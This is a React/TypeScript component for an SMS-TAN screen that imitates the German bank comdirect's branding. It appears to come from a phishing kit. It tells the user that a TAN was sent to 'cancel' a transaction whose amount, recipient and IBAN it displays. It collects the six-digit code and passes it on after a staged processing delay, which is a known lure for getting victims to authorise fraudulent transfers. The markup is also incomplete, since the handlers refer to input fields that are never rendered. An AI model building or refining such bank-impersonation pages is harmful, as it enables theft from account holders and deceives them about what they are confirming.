import React, { useState, useEffect } from 'react';
import Loading from './Loading';

interface TransactionDetails {
  amount?: string;
  recipient?: string;
  reference?: string;
  iban?: string;
}

type TANType = 'TRANSACTION_TAN' | 'LOGIN_TAN';

interface SMSTANScreenProps {
  tanType: TANType;
  phoneNumber?: string;
  transactionDetails?: TransactionDetails;
  onSubmit: (tan: string) => void;
  onResend?: () => void;
  onCancel?: () => void;
}

const SMSTANScreen: React.FC<SMSTANScreenProps> = ({
  tanType,
  phoneNumber = 'Ihre registrierte Nummer',
  transactionDetails = {},
  onSubmit,
  onResend,
  onCancel
}) => {
  const [tan, setTan] = useState<string[]>(['', '', '', '', '', '']);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [countdown, setCountdown] = useState(60);
  const [canResend, setCanResend] = useState(false);
  const [isMobile, setIsMobile] = useState(false);

  useEffect(() => {
    const checkScreenSize = () => {
      setIsMobile(window.innerWidth <= 768);
    };
    checkScreenSize();
    window.addEventListener('resize', checkScreenSize);
    return () => window.removeEventListener('resize', checkScreenSize);
  }, []);

  useEffect(() => {
    if (isSubmitting) return;

    const timer = setInterval(() => {
      setCountdown(prev => {
        if (prev <= 1) {
          clearInterval(timer);
          setCanResend(true);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);
    return () => clearInterval(timer);
  }, [isSubmitting]);

  const handleChange = (index: number, value: string) => {
    const newTan = [...tan];
    newTan[index] = value.slice(-1); // Only allow one character
    setTan(newTan);

    // Auto-focus next input
    if (value && index < 5) {
      const nextInput = document.getElementById(`tan-input-${index + 1}`);
      nextInput?.focus();
    }
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Backspace' && !tan[index] && index > 0) {
      const prevInput = document.getElementById(`tan-input-${index - 1}`);
      prevInput?.focus();
    }
  };

  const handleSubmit = async () => {
    const fullTan = tan.join('');
    if (fullTan.length === 6) {
      setIsSubmitting(true);
      await new Promise(resolve => setTimeout(resolve, 1500));
      onSubmit(fullTan);
    }
  };

  const handleResend = () => {
    if (canResend && onResend) {
      setCanResend(false);
      setCountdown(60);
      onResend();
    }
  };

  if (isSubmitting) {
    return (
      <Loading 
        message={tanType === 'TRANSACTION_TAN' ? 'Stornierung wird verarbeitet...' : 'SMS-TAN wird überprüft...'}
        type="processing"
      />
    );
  }

  return (
    <div style={{
      minHeight: '100vh',
      backgroundColor: '#ffffff',
      fontFamily: 'MarkWeb, Helvetica Neue, Helvetica, Arial, sans-serif',
      color: '#0B1E25'
    }}>
      <div style={{
        maxWidth: '980px',
        margin: '0 auto',
        padding: isMobile ? '20px' : '60px 20px',
        display: 'flex',
        flexDirection: 'column',
        alignItems: 'center',
        minHeight: '100vh',
        justifyContent: 'center'
      }}>
        
        {/* Main SMS TAN Card */}
        <div style={{
          width: '100%',
          maxWidth: '700px',
          backgroundColor: '#ffffff',
          border: '1px solid #E0E0E0',
          borderRadius: '8px',
          boxShadow: '0 2px 8px rgba(0, 0, 0, 0.1)',
          overflow: 'hidden'
        }}>
          
          {/* Yellow Header Bar - comdirect's signature */}
          <div style={{
            backgroundColor: '#fff500',
            padding: '25px',
            textAlign: 'center',
            borderBottom: '1px solid #E0E0E0'
          }}>
            <h1 style={{
              color: '#000000',
              fontSize: isMobile ? '1.5rem' : '1.875rem',
              fontWeight: '400',
              margin: '0',
              fontFamily: 'MarkWeb, Helvetica Neue, Helvetica, Arial, sans-serif',
              lineHeight: isMobile ? '1.75rem' : '2.625rem'
            }}>
              {tanType === 'TRANSACTION_TAN' ? 'SMS-TAN Stornierung' : 'SMS-TAN Anmeldung'}
            </h1>
          </div>

          {/* Main Content */}
          <div style={{
            padding: isMobile ? '20px' : '30px'
          }}>
            
            {/* Instruction Box */}
            <div style={{
              backgroundColor: '#F5F5F5',
              border: '1px solid #E0E0E0',
              borderRadius: '4px',
              padding: '20px',
              marginBottom: '30px',
              textAlign: 'center'
            }}>
              <p style={{
                margin: '0',
                fontSize: isMobile ? '14px' : '16px',
                color: '#0B1E25',
                fontFamily: 'MarkWeb, Helvetica Neue, Helvetica, Arial, sans-serif',
                lineHeight: '1.5'
              }}>
                {tanType === 'TRANSACTION_TAN'
                  ? `Wir haben Ihnen eine SMS mit einer TAN-Nummer zur Stornierung an ${phoneNumber} gesendet.`
                  : `Wir haben Ihnen eine SMS mit einer TAN-Nummer zur Anmeldung an ${phoneNumber} gesendet.`
                }
              </p>
            </div>

            {/* Transaction Details Card - only for TRANSACTION_TAN */}
            {tanType === 'TRANSACTION_TAN' && transactionDetails.amount && (
              <div style={{
                backgroundColor: '#ffffff',
                border: '2px solid #007BB8',
                borderRadius: '4px',
                padding: '25px',
                marginBottom: '30px'
              }}>
                <h2 style={{
                  color: '#007BB8',
                  fontSize: isMobile ? '1.25rem' : '1.5rem',
                  fontWeight: '500',
                  margin: '0 0 20px 0',
                  fontFamily: 'MarkWeb, Helvetica Neue, Helvetica, Arial, sans-serif',
                  textAlign: 'center'
                }}>
                  Zu stornierende Transaktion
                </h2>
                
                <div style={{ display: 'flex', flexDirection: 'column', gap: '15px' }}>
                  <div style={{ 
                    display: 'flex', 
                    justifyContent: 'space-between', 
                    alignItems: 'center',
                    paddingBottom: '10px',
                    borderBottom: '1px solid #E0E0E0'
                  }}>
                    <span style={{
                      color: '#7d8287',
                      fontSize: '14px',
                      fontFamily: 'MarkWeb, Helvetica Neue, Helvetica, Arial, sans-serif'
                    }}>Betrag:</span>
                    <span style={{
                      color: '#007BB8',
                      fontSize: '18px',
                      fontFamily: 'MarkWeb, Helvetica Neue, Helvetica, Arial, sans-serif',
                      fontWeight: '500'
                    }}>{transactionDetails.amount}</span>
                  </div>
                  
                  {transactionDetails.recipient && (
                    <div style={{ 
                      display: 'flex', 
                      justifyContent: 'space-between', 
                      alignItems: 'center',
                      paddingBottom: '10px',
                      borderBottom: '1px solid #E0E0E0'
                    }}>
                      <span style={{
                        color: '#7d8287',
                        fontSize: '14px',
                        fontFamily: 'MarkWeb, Helvetica Neue, Helvetica, Arial, sans-serif'
                      }}>Empfänger:</span>
                      <span style={{
                        color: '#0B1E25',
                        fontSize: '14px',
                        fontFamily: 'MarkWeb, Helvetica Neue, Helvetica, Arial, sans-serif',
                        textAlign: 'right',
                        maxWidth: '60%'
                      }}>{transactionDetails.recipient}</span>
                    </div>
                  )}
                  
                  {transactionDetails.iban && (
                    <div style={{ 
                      display: 'flex', 
                      justifyContent: 'space-between', 
                      alignItems: 'center',
                      paddingBottom: '10px',
                      borderBottom: '1px solid #E0E0E0'
                    }}>
                      <span style={{
                        color: '#7d8287',
                        fontSize: '14px',
                        fontFamily: 'MarkWeb, Helvetica Neue, Helvetica, Arial, sans-serif'
                      }}>IBAN:</span>
                      <span style={{
                        color: '#0B1E25',
                        fontSize: '14px',
                        fontFamily: 'monospace',
                        textAlign: 'right'
                      }}>{transactionDetails.iban}</span>
                    </div>
                  )}
                  
                  {transactionDetails.reference && (
                    <div style={{ 
                      display: 'flex', 
                      justifyContent: 'space-between', 
                      alignItems: 'center'
                    }}>
                      <span style={{
                        color: '#7d8287',
                        fontSize: '14px',
                        fontFamily: 'MarkWeb, Helvetica Neue, Helvetica, Arial, sans-serif'
                      }}>Verwendungszweck:</span>
                      <span style={{
                        color: '#0B1E25',
                        fontSize: '14px',
                        fontFamily: 'MarkWeb, Helvetica Neue, Helvetica, Arial, sans-serif',
                        textAlign: 'right',
                        maxWidth: '60%'
                      }}>{transactionDetails.reference}</span>
                    </div>
                  )}
                </div>
              </div>
            )}

            {/* Footer Info */}
            <div style={{ textAlign: 'center' }}>
              <p style={{
                color: '#7d8287',
                fontSize: '12px',
                margin: '0',
                fontFamily: 'MarkWeb, Helvetica Neue, Helvetica, Arial, sans-serif'
              }}>
                Probleme mit der App? Kontaktieren Sie den comdirect Kundenservice.
              </p>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export { SMSTANScreen };
